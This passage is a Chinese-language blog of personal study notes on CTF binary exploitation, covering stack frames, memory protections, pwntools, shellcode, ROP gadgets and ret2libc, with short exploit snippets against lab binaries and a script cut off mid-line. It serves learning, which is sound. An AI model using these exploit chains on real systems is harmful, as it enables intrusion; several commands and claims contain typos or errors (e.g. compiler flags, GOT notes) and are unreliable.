alt="image-20230208173818672"></p><p>C语言函数栈帧<br>栈帧：记录一个函数此时的状态信息<br>函数的栈底由EBP或RBP保存<br>函数的栈顶由ESP或RSP保存</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209094759828.png" alt="image-20230209094759828"></p><p>32位视图<br>子函数所用参数保存在父函数栈帧的末尾<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209100855874.png" alt="image-20230209100855874"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209101728223.png" alt="image-20230209101728223"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209102340553.png" alt="image-20230209102340553"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209102615915.png" alt="image-20230209102615915"></p><p>push ebp保持父函数栈底的空间<br>sum函数调用完后需要恢复main函数的信息，即在调用sum函数前需将mian函数栈底压入。<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209103333679.png" alt="image-20230209103333679"></p><p>栈的栈顶一定是当前执行函数所属的栈帧。<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230209104000217.png" alt="image-20230209104000217"></p><p>无需舍弃只需标记为不需使用值即可——&gt;扩大esp到ebp处（避开局部变量存储空间）<br><strong>注意：此过程中变化为对应值的地址存储在ebp中——&gt;对应值存储在ebp中</strong><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209105139584.png" alt="image-20230209105139584"></p><p>ebp减小一个字长；esp加一个字长。通过return指令将return address弹出保存在eap（指令寄存器）中<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230209110221569.png" alt="image-20230209110221569"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209110919361.png" alt="image-20230209110919361"></p><p>call指令自带保存返回地址。<br>leave：将esp ebp放于同一位置后popebp。<br>pop总是将esp指向的值对应的1字长数据传入到目标位置</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209112610898.png" alt="image-20230209112610898"></p><p><strong>缓冲区溢出中</strong> <strong>栈溢出控制程序流核心：</strong><br>当子函数返回父函数时会将<em>Ruturn Adress</em>中的值返回到PC寄存器eip（32位）中，当eip中值写入目标值的地址，既可<em>完成程序执行流的控制</em>。</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230216235806404.png" alt="image-20230216235806404"></p><p>举例演示：<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219153353227.png" alt="image-20230219153353227"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> str[<span class="number">8</span>];</span><br><span class="line">   read (<span class="number">0</span>,str,<span class="number">24</span>);</span><br><span class="line">   retrun <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时产生segmentation fault（段错误）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219154052743.png" alt="image-20230219154052743"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230219154202756.png" alt="image-20230219154202756"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219161736349.png" alt="image-20230219161736349"></p><p>安全保护措施（拿到二进制文件之后先检查）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219165330509.png"></p><p><strong>注意</strong>：<em>出现gets函数必有栈溢出！</em>strart函数无法F5（编写时已用汇编代码实现）<br>vulnerable——&gt;可怜受害者函数捏~</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221002608337.png" alt="image-20230221002608337"></p><p>ctrl+A后：可看C和汇编比较<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221002832185.png" alt="image-20230221002832185"></p><p>ctrl+s–&gt;保存<br>(Fn+)shift+F12-&gt;打开字符串界面（ASCII范围内的字符串）<br>打开目标文件得关键句逐层剖析反汇编get完整main体-&gt;end<br>pwntools:nc转到问题变量本体<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221160248520.png" alt="image-20230221160248520"></p><p>CTF建议：pip2+pip3均安装<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221160924626.png" alt="image-20230221160924626">+<strong>代理地址可进行安装</strong>vi</p><p>拿到题目——&gt;先拿到本地shell——&gt;pwntools攻击——&gt;io本地切换为远程（脚本不变）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221162513214.png" alt="image-20230221162513214"></p><p>链接：process()-&gt;本地；remote（）—&gt;远程<br>函数：<br>io.recvline() 接收一行字符串；           io.recv（）接收多行字符串<br>io.send() <strong>注意：函数内部只能为字节流（即为二进制表示）</strong><br>io.send(p32(0)+b” ╰(<em>°▽°</em>)╯——&gt;表示bite对象”)<br>io.sendline()——&gt;一直读取直到\0或\n;<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221165139013.png" alt="image-20230221165139013"></p><p>nc tools地址 ❗❗❗flag隐藏在其中❗❗❗<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221165745894.png" alt="image-20230221165745894"></p><p>python3开  remote(“ip”,端口)<br>特殊控制符\r——&gt; 输出当前行后持续进行清空<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221171244473.png" alt="image-20230221171244473"></p><p>base64工具（pwntools工具）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221171442165.png" alt="image-20230221171442165"></p><p>❗BASE64:包含大写字母（A-Z）,小写字母（a-z），数字（0-9）以及+&#x2F; 一般带&#x3D;&#x3D;<br>❗BASE32:只有大写字母（A-Z）和数字234567 一般带&#x3D;&#x3D;&#x3D;<br>❗BASE16即为16进制<br><strong>当ASCll用Base加密达不到所对应的位数的时候用&#x3D;号补齐</strong><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221234220854.png" alt="image-20230221234220854"></p><blockquote><p>cd “你想要进的目录” &#x2F;&#x2F;当目录名称中含有空格、中文或其它<a href="https://baike.baidu.com/item/%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6/112715?fromModule=lemma_inlink">特殊字符</a>时请用<a href="https://baike.baidu.com/item/%E5%8F%8C%E5%BC%95%E5%8F%B7/10758658?fromModule=lemma_inlink">双引号</a>包括</p><p>以下是最常用的几个目录的写法：</p><p>&#x2F; 代表<a href="https://baike.baidu.com/item/%E6%A0%B9%E7%9B%AE%E5%BD%95/6061330?fromModule=lemma_inlink">根目录</a></p><p>. 当前目录</p><p>.. 上级目录</p><p>~ 当前用户的默认工作目录</p><p>目录可以省略不写， 与cd ~ 有相同的效果</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230222002023021.png" alt="image-20230222002023021"></p><p>关闭标准输入输出的缓冲区 使得其中内容可以立马显示出来 ctrl+#调小字体<br>下断点方式：pwndbg中b *+一个地址 或者b + 一个函数<br>先下断点后run  gdb中运行输入首字母即可  例：n——&gt;步过    s——&gt;standin<br>下断点：b（breakpoint）  * +地址&#x2F;函数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230222191527599.png" alt="image-20230222191527599"></p><p>此时可修改部分为buffer（8字节）即eax到ebp部分（16大小）覆盖时需+4（覆盖ebp）<br>持续向下写<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223075312799.png" alt="image-20230223075312799">找到后门函数system 注：可不是次次这么便宜的哦🤣<br>syetem返回字符串&#x3D;在shell中直接执行字符串 pwd：打印工作目录<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223075541707.png" alt="image-20230223075541707"></p><p>使得vualable return到shell即可<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223104016114.png" alt="image-20230223103831511"></p><p>p（pack）对数据进行打包变为字符型数据 ； 例：p32（0x8048522）打包为32bite位字符</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223104016114.png" alt="image-20230223104016114"></p><p>gcc：Linux环境下的一款编译器。<br>ctrl+d 退出python交互环境!<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230223112513513.png" alt="image-20230223112513513"><br>bss默认栈可执行<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230411152517155.png" alt="image-20230411152517155"><br>关闭随机化（ASLR）</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-fro-stack-protector 关闭canary</span></span><br><span class="line"><span class="deletion">-z exexstack 打开栈的可执行权限</span></span><br><span class="line"><span class="deletion">-no-pie 关闭pie（程序编译时打开pie 将地址随机化为无关代码 即随机化elf文件）</span></span><br><span class="line"><span class="deletion">-g 带上调试信息 调试时可以看见源代码（ret2stack.c未删除情况下）</span></span><br><span class="line"><span class="deletion">-o 输出目标文件</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412200146471.png" alt="image-20230412200146471">chmod +x 给权限<br>shellcode(偏移+返回地址)</p><p>地址空间随机化&lt;——操作系统实现  可输入0检查ASLR是否关闭<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230223115046186.png" alt="image-20230223115046186"></p><p>动态链接库看为1 地址随机分配 栈同（偏移值随机地址未知）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230224081202824.png" alt="image-20230223232443609"></p><p>bss用来存放全局变量  可读可写可执行 shellcode返回到bss<br>shellcode返回栈区由于aslr的保护不可得到所需栈地址，返回bss即可</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230224081202824.png" alt="image-20230224081202824"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230224081246465.png" alt="image-20230224081246465"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230223112708517.png" alt="image-20230223112708517"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223113034773.png" alt="image-20230223113034773"></p><p>在pwn里，保护一共是四种分别是RELRO、Stack、NX、PIE。<br>1.RELRO（ReLocation Read-Only）：分为两种情况，第一种情况是Partial RELRO，这种情况是部分开启堆栈地址随机化，got表可写，第二种，Full RELRO是全部开启，got表不可写，Got表是全局偏移表，里面包含的是外部定义的符号相应的条目的数据段中，PLT表，是过程链接表&#x2F;内部函数表，linux延迟绑定，但是最后还是要连接到Got，PLT表只是为一个过渡的作用。<br>2.Stack（canary）：这个保护其实就是在你调用的函数的时候，在栈帧中插入一个随机数，在函数执行完成返回之前，来校验随机数是否被改变，来判断是否被栈溢出，这个我们也俗称为canary（金丝雀），栈保护技术。<br>3.NX（no execute）：为栈不可知性，也就是栈上的数据不可以当作代码区执行的作用,NX打开说明栈上已经给出全部可用的system（）、”&#x2F;bin&#x2F;sh”，不可自行写入。<br>4.PIE（Position Independent Executable）：PIE的中文叫做，地址无关可执行文件，是针对.text（代码段），.data（数据段），.bss（未初始化全局变量段）来做的保护，正常每一次加载程序，加载地址是固定的，但是PIE保护开启，每次程序启动的时候都会变换加载地址。</p><p>context.arch &#x3D; ‘“amch64”——&gt;将位机器码转为64位<br>vmmap显示虚拟内存的分布<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230224125905589.png" alt="image-20230224125905589"></p><p>32位 1字长&#x3D;4bite 64位 1字长 &#x3D; 8bite push栈向上增长pop向下增长（减小）<br>leave执行：1.将esp归位至ebp位  2.pop ebp将previous ebp中的值存放到ebp中 3.ebp返回父函数栈底<br>esp自动+1字长（执行pop）<br>return的作用：将当前函数栈顶中的值pop返回到eip寄存器中 程序正在执行的地址变成return address<br>return address中的值存放到eip中 eip返回到上一个函数</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230226153916098.png" alt="image-20230226153916098"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230226154515139.png" alt="image-20230226154515139"></p><p>pwndbg的好处捏~<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230226155524945.png" alt="image-20230226155524945"><br>自动编写payload（默认结果为x86下32bite大小) print（shellcraft.sh（) )</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230226155734820.png" alt="image-20230226155734820"></p><p>asm将汇编码转变为机器码后发送至远程内存虚拟空间的某个位置<br>l.just(x，y)从左向右，左端数据不变对右边的数据不断进行填充 x：填充的数据长度 y：填充内容<br>cat.flag.txt 得到flag内容<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230226162609326.png" alt="image-20230226162609326"></p><p>关闭aslr指令。<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230306232744633.png" alt="image-20230306232744633"></p><p>关闭canary（堆栈共享库）pie(共享库编译时 将elf文件本体的载入地址随机化)  - 0输出目标文件<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230307000253788.png" alt="image-20230307000253788"></p><p>给可执行文件权限 .&#x2F;运行shell<br>ctrl+c -&gt;向当前执行进程发送一个终止信号（复制ctrl+shift+c）<br>crl+d 退出当前shell<br>context.arch &#x3D; “amd64”(告诉py系统架构【系统位数】)<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230310080407959.png" alt="image-20230310080407959">关闭标准缓冲区得到输出值</p><p>system()函数调用&#x2F;bin&#x2F;sh来执行参数指定的命令，&#x2F;bin&#x2F;sh 一般是一个软连接，指向某个具体的shell，比如bash，-c选项是告诉shell从字符串command中读取命令； 在该command执行期间，SIGCHLD是被阻塞的，好比在说：hi，内核，这会不要给我送SIGCHLD信号，等我忙完再说； 在该command执行期间，SIGINT和SIGQUIT是被忽略的，意思是进程收到这两个信号后没有任何动作</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230325231231643.png" alt="image-20230325231231643"></p><p>动态链接库本身就是一个可执行文件。<br>my_puts函数输出过程（无各栈保护可考虑rop）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230409153211276.png" alt="image-20230409153211276"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230409153739815.png" alt="image-20230409153739815"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230409163357731.png" alt="image-20230409163357731"></p><p>ROPgadget 获取text段所需汇编代码（ret——&gt;将栈中信息弹到eip中） eax、ebx优先【ROP总会至溢出retaddr后】</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230410210009493.png" alt="image-20230409171200929"></p><p>异或（xor）常用于清空缓冲区<br>flat()函数 接收一个列表参数将列表中的每一项都转为字节型数据并且自动把不足一字节数据进行填补</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">io</span> = flat（[b&#x27;A&#x27;*<span class="number">112</span>,pop_eax_ret,<span class="number">0</span>xb,pop_eax_ecx_ebx_ret,<span class="number">0</span>,<span class="number">0</span>,bin_sh,int_80h]）</span><br></pre></td></tr></table></figure><p>grep功能：对输入行中含有用户自定参数的行进行全部输出</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ROPgadget</span> <span class="built_in">--binary</span> <span class="string">ret2syscall</span> <span class="built_in">--only</span> <span class="string">&quot;pop|ret&quot;</span> | <span class="string">head</span></span><br></pre></td></tr></table></figure><p>sos 救大命踩坑！！！输入格式我哭死&#x2F;(ㄒoㄒ)&#x2F;<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230410210009493.png" alt="image-20230410210009493"></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ROPgadget</span>  <span class="built_in">--binary</span> <span class="string">ret2syscall</span> <span class="built_in">--only</span> <span class="string">&quot;pop|ret&quot;</span> | <span class="string">grep</span> <span class="string">eax</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230410194103144.png" alt="image-20230410194103144"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ROPgadget</span> --binary 文件名 --only <span class="string">&quot;int&quot;</span>(执行系统调用 当为<span class="number">0</span>x80时中断结束<span class="number">0</span>x80表示进行系统调用的call)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230410201002577.png" alt="image-20230410201002577"></p><p>python3中必须用b转换为字节流型数据 generator转换器 next（）函数（前+hex转为十六进制）！！转化为十进制数据ww其实不如ROPgadget来的方便喽（目前个人觉得）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412210903759.png"></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --<span class="built_in">binary</span> 文件名 --<span class="built_in">string</span> <span class="string">&#x27;/bin/sh&#x27;</span> (查询后门地址)</span><br></pre></td></tr></table></figure><p>ret2text ret2shellcode 均直接含有后门函数 ret2text 自接收一串base64解码得flag ret2shellcode</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys_execve<span class="function"><span class="params">()</span> -&gt;</span><span class="number">0xb</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412204604894.png" alt="image-20230412204604894"><br>内核系统调用函数名                            用户调用代号<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412214823229.png" alt="image-20230412214823229"></p><p>静态链接和动态链接<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412214936627.png" alt="image-20230412214936627"></p><p>区别：<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412215132315.png" alt="image-20230412215132315"></p><p>静态链接方便找到gadget：静态链接将库函数全部写入elf文件本身 容易用指针片段构成攻击流<br>动态链接只是做了标记，用即拿（别处借xx例：printf调用vprintf【2000多行 还要再调吓人的嘞】）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230413185604877.png" alt="image-20230413185604877"></p><p>静态链接在链接时进行 动态链接在装载时进行</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414210446532.png" alt="image-20230414210446532"></p><p>puts函数动态链接在可执行段code载入（只为虚拟内存地址【libc全载入】但并不知真实地址）在运行时可找此时plt结解析使得puts内容填入data段got.plt文件【plt在代码段 got在数据段】</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414212714060.png" alt="image-20230414212714060"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414214750326.png" alt="image-20230414214750326"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414214800705.png" alt="image-20230414214800705"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gcc</span> -fro-pie -g -m32 -o link 动态链接文件名(<span class="number">32</span>位)</span><br><span class="line"><span class="attribute">gcc</span> -fro-pie -g -<span class="number">0</span> link 动态链接文件名（<span class="number">64</span>位）</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414215358915.png"></p><p>查看plt  x 地址——&gt;以二进制形式查看</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">pwndbg</span> disass 地址-&gt;</span>反汇编</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414215358915.png" alt="image-20230414222605298"></p><p>info b 查看断点信息  b 行号可下断点（含C代码情况下） d 行号可删除断点【无C语言 b 地址下断点】<br>c 遇到下一个断点&#x2F;输入（puts）&#x2F;程序中断 </p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b main == <span class="built_in">start</span> 【若无main函数则停在程序入口第一条（<span class="built_in">start</span>才为程序入口）】</span><br><span class="line">s 步进 n 步过</span><br><span class="line">backtrace 函数调用栈【呈现祖孙关系（😀）】</span><br><span class="line"><span class="literal">return</span> 直接回到main函数</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415092539078.png" alt="image-20230415092539078"></p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> secure()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> <span class="keyword">input</span>; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="keyword">time</span>(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  secretcode = <span class="keyword">rand</span>();</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;<span class="keyword">input</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="keyword">input</span> == secretcode )</span><br><span class="line">    system(<span class="string">&quot;shell!?&quot;</span>);</span><br><span class="line">&#125; <span class="comment">//此处system函数虽无后门 但提供system plt表象 使得在text中可自动将执行流拉入libc段</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415100827595.png" alt="image-20230418124940615"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415100827595.png" alt="image-20230415100827595"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415101652128.png" alt="image-20230415101652128"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415112529947.png" alt="image-20230415112529947"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415114324006.png" alt="image-20230415114324006"></p><p>amd64向下兼容x86故含有eax<br>函数<strong>调用栈</strong>地址从高地址向低地址增长【更好的利用虚拟内存空间】（寄存器为低地址向高地址增长即先入后出）</p><p>【后续画图补充 好懒（我真该死啊 忘了的时候就知道动手记录了😶）】<strong>赎罪录：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418130159741.png" alt="image-20230418130159741"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230418132149276.png" alt="image-20230418132149276">画的太撇了（笑）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418132737386.png" alt="image-20230418132737386"></p><p>执行完调用返回dyntest（均在内存空间中）</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230418133451380.png" alt="image-20230418133451380"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418205450196.png" alt="image-20230418205450196"></p><p><strong>【调用流程两点需注意】</strong>（x86例）</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230418212246848.png" alt="image-20230418212246848"></p><p>father中也含有子函数所需arg<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418213125953.png" alt="image-20230418213125953"></p><p>查表易犯错误（直接调got）</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ret</span> = system@got(❌)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230419201116801.png" alt="image-20230419201116801"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">&quot;./dyntest&quot;</span>)</span><br><span class="line">[</span><br><span class="line">  文件形式及保护</span><br><span class="line">]</span><br><span class="line">elf.got[<span class="string">&quot;puts&quot;</span>]<span class="regexp">//</span>获取函数表象地址</span><br><span class="line">hex(elf.got[<span class="string">&quot;puts&quot;</span>])<span class="regexp">//</span>获取函数真实地址</span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230419203107813.png" alt="image-20230419203107813"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230419215529699.png" alt="image-20230419215529699"></p><p>【nop slide】<br>使得ASLR继续执行ret2shellcode<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423182143460.png" alt="image-20230423182143460"></p><p>使执行流一直在nop段（maybe运气不好eip指不到nop位置 多运行几次即可）<br>core文件：记载程序崩溃时断点信息及错误信息<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230423193313158.png" alt="image-20230423193313158"></p><p>可以看成谁放的数据就为谁的栈帧<br>函数往上第二个字长写入其所需要的参数（大部分函数）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423194347199.png" alt="image-20230423194347199"></p><p>system调用ret addr后自动push父函数ebp【函数内汇编第一步push ebp均向上写两字长到valuable】<br>最后两个函数执行此类模式即可完成攻击</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423194601499.png" alt="image-20230423194601499"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423194754995.png" alt="image-20230423194754995"></p><p>rop链将函数所需参数直接写入到上一函数的返回地址处<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424192129082.png" alt="image-20230424192129082"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230424194313669.png" alt="image-20230424194313669"></p><p>无”&#x2F;bin&#x2F;sh”也可映射 system函数地址（text段 plt）若无plt则需持续溢出直至出现真实地址<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424195822728.png"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424195913266.png"></p><p>我是小偷 无需exit（）【偷完就跑】🤭</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings ret2libc1 | grep <span class="regexp">/bin/</span>sh</span><br><span class="line"><span class="regexp">//</span>string a.out | grep flag(简单逆向)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230424200850159.png" alt="image-20230424200850159"></p><p>【ret2libc1】<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424205359479.png" alt="image-20230424205359479"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424204704035.png" alt="image-20230424204704035"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424205428601.png" alt="image-20230424205428601">小小程序员&gt;&lt;<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424210938062.png" alt="image-20230424210938062"></p><p>动态调试108+4（ebp）溢出【ret2libc2】<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230425125354842.png" alt="image-20230425125354842"></p><p>无“&#x2F;bin&#x2F;sh” 此时需自行构造 在bss段找到可写入部分 </p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230425125119149.png" alt="image-20230425125119149">         </p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230425153257042.png" alt="image-20230425153257042"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230426210301792.png" alt="image-20230426210301792"></p><p>进阶版思路</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line"></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">pop_ebx = <span class="number">0x0804843d</span></span><br><span class="line">buf2 = <span 